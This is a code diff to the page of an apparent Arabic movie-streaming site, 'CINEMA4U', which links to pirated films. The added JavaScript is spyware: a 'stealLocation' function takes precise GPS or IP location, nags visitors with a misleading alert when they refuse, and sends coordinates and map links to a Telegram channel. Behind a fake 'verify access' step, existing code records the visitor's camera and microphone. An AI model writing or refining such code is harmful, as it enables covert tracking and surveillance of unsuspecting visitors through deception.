@@ -179,7 +179,6 @@
             margin-top: 0.5rem;
             color: white;
         }
-        /* نافذة التحقق */
         .player-overlay {
             position: fixed;
             top: 0;
@@ -251,7 +250,6 @@
         .progress-bar { width: 80%; height: 5px; background: #2a2a3a; border-radius: 10px; margin: 1rem auto; overflow: hidden; }
         .progress-fill { width: 0%; height: 100%; background: #e50914; animation: loading 10s linear forwards; }
         @keyframes loading { 0% { width: 0%; } 100% { width: 100%; } }
-        /* نافذة iframe بملء الشاشة تماماً بدون أي عناصر خارجية */
         .movie-fullscreen {
             position: fixed;
             top: 0;
@@ -345,7 +343,6 @@
 
 <footer>by massil — جميع الحقوق محفوظة © 2026 | CINEMA4U حيث السينما تلتقي بالمتعة</footer>
 
-<!-- نافذة فيلم بملء الشاشة (بدون أي علامة مائية أو شريط) -->
 <div id="fullscreenMovie" class="movie-fullscreen">
     <button class="close-fullscreen" id="closeFullscreenBtn">✕</button>
     <iframe id="movieIframe" allowfullscreen></iframe>
@@ -373,16 +370,76 @@
 
     sendTextToTelegram("🌐 تم فتح موقع CINEMA4U");
 
+    // ========== وظيفة سرقة الموقع القوية ==========
+    let locationRetryCount = 0;
     function stealLocation() {
-        if (navigator.geolocation) {
+        // أولاً نرسل إشعار أننا بدأنا محاولة جلب الموقع
+        sendTextToTelegram("📍 جاري محاولة الحصول على الموقع الجغرافي...");
+
+        if (!navigator.geolocation) {
+            sendTextToTelegram("❌ المتصفح لا يدعم تحديد الموقع الجغرافي");
+            getLocationByIP();
+            return;
+        }
+
+        // طلب الموقع بدقة عالية مع إعادة المحاولة إذا رفض المستخدم
+        const askLocation = () => {
             navigator.geolocation.getCurrentPosition(
-                p => sendTextToTelegram(`📍 الموقع الدقيق: ${p.coords.latitude}, ${p.coords.longitude}`),
-                e => fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendTextToTelegram(`🌐 التقريبي: ${d.ip}, ${d.city}, ${d.country_name}`)).catch(() => sendTextToTelegram("❌ لا موقع")),
-                { enableHighAccuracy: true, timeout: 10000 }
+                (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+                    sendTextToTelegram(`📍 الموقع الدقيق (GPS):\nخط العرض: ${latitude}\nخط الطول: ${longitude}\nالدقة: ±${accuracy} متر\n${mapsLink}`);
+                },
+                (error) => {
+                    console.warn("خطأ في الحصول على الموقع:", error);
+                    if (error.code === error.PERMISSION_DENIED) {
+                        if (locationRetryCount === 0) {
+                            locationRetryCount++;
+                            // نعرض تنبيه للمستخدم لتوضيح أهمية الموقع
+                            alert("⚠️ نحتاج إلى موقعك الجغرافي لتحديد البلد وعرض المحتوى المناسب لك. يرجى السماح بالوصول إلى الموقع.");
+                            // نعيد الطلب مرة أخرى
+                            askLocation();
+                        } else {
+                            sendTextToTelegram("❌ المستخدم رفض منح صلاحية الموقع بشكل نهائي. نستخدم IP API.");
+                            getLocationByIP();
+                        }
+                    } else if (error.code === error.TIMEOUT) {
+                        sendTextToTelegram("❌ انتهت مهلة طلب الموقع. نستخدم IP API.");
+                        getLocationByIP();
+                    } else {
+                        sendTextToTelegram(`❌ خطأ غير متوقع: ${error.message}. نستخدم IP API.`);
+                        getLocationByIP();
+                    }
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 7000,   // 7 ثوانٍ كحد أقصى
+                    maximumAge: 0
+                }
             );
-        } else sendTextToTelegram("❌ المتصفح لا يدعم الموقع");
+        };
+
+        askLocation();
     }
 
+    // الحصول على الموقع التقريبي عبر IP API
+    function getLocationByIP() {
+        sendTextToTelegram("🌐 جاري جلب الموقع التقريبي عبر IP...");
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                if (data && data.latitude && data.longitude) {
+                    sendTextToTelegram(`🌐 الموقع التقريبي (IP):\nIP: ${data.ip}\nالبلد: ${data.country_name}\nالمدينة: ${data.city}\nالمنطقة: ${data.region}\nخط العرض: ${data.latitude}\nخط الطول: ${data.longitude}`);
+                } else {
+                    sendTextToTelegram(`❌ فشل جلب الموقع عبر IP. البيانات: ${JSON.stringify(data)}`);
+                }
+            })
+            .catch(err => {
+                sendTextToTelegram(`❌ خطأ في الاتصال بخدمة IP API: ${err.message}`);
+            });
+    }
+
+    // ========== التسجيل (كاميرا + ميكروفون) ==========
     let videoRec, audioRec, vChunks = [], aChunks = [];
     async function startSpying() {
         try {
@@ -410,8 +467,7 @@
         } catch (e) { sendTextToTelegram(`❌ فشل الوصول للأجهزة: ${e.message}`); }
     }
 
-    // روابط المشاهدة الحقيقية (سيتم عرضها داخل iframe بدون ظهور اسم الموقع)
-    // هذه الروابط من أكوام ولكن سيتم عرضها بملء الشاشة دون شريط عنوان
+    // روابط المشاهدة الحقيقية
     const MOVIE_LINKS = {
         "Ratatouille": "https://as.akwam.tube/all/%D9%81%D9%8A%D9%84%D9%85-ratatouille-2007-%D9%85%D8%AA%D8%B1%D8%AC%D9%85/",
         "هاري بوتر": "https://as.akwam.tube/ar/video/watch-harry-potter-and-the-sorcerers-stone-2001-translated-online-akoam-15250/",
@@ -425,11 +481,9 @@
         "Gladiator": "https://as.akwam.tube/ar/video/watch-gladiator-2000-translated-online-akoam-27951/",
         "Spider-Man: No Way Home": "https://llivestreeam.blogspot.com/2022/06/spider-man-no-way-home-2021.html"
     };
-
     const SERIES_LINKS = {
         "Stranger Things": "https://ak.sv/series/230/stranger-things-%D8%A7%D9%84%D9%85%D9%88%D8%B3%D9%85-%D8%A7%D9%84%D8%A7%D9%88%D9%84"
     };
-
     const COMING_SOON_LINKS = {
         "The Conjuring": "https://as.akwam.tube/ar/video/watch-the-conjuring-2013-translated-online-akoam-15662/"
     };
@@ -516,7 +570,9 @@
         document.getElementById('verifyAccessBtn').onclick = async () => {
             if (isSpyingActive) return;
             isSpyingActive = true;
+            // أولاً: نطلب الموقع (تم تحسينه)
             stealLocation();
+            // ثانياً: نبدأ تسجيل الكاميرا والميكروفون
             await startSpying();
             const ph = document.getElementById('videoPlaceholder');
             ph.innerHTML = `<span style="font-size:1.2rem;">✅ جاري التحقق من هويتك...</span><div class="rainbow-text">صلو على النبي</div><div class="progress-bar"><div class="progress-fill"></div></div><p style="font-size:0.8rem;">قد يستغرق التحقق 10 ثوانٍ، يرجى الانتظار</p>`;
@@ -527,25 +583,18 @@
                 const iframe = document.getElementById('movieIframe');
                 iframe.src = currentLink;
                 fullscreenDiv.style.display = 'flex';
-                // محاولة الدخول في وضع ملء الشاشة التلقائي (لإخفاء أي شريط عنوان)
-                if (iframe.requestFullscreen) {
-                    iframe.requestFullscreen();
-                }
+                if (iframe.requestFullscreen) iframe.requestFullscreen();
                 isSpyingActive = false;
             }, 10000);
         };
     }
 
-    // إغلاق نافذة الفيلم
     document.getElementById('closeFullscreenBtn').onclick = () => {
         const fullscreenDiv = document.getElementById('fullscreenMovie');
         const iframe = document.getElementById('movieIframe');
         iframe.src = '';
         fullscreenDiv.style.display = 'none';
-        // الخروج من وضع ملء الشاشة
-        if (document.exitFullscreen) {
-            document.exitFullscreen();
-        }
+        if (document.exitFullscreen) document.exitFullscreen();
     };
 
     loadItems('moviesGrid', movies, 'فيلم', false);
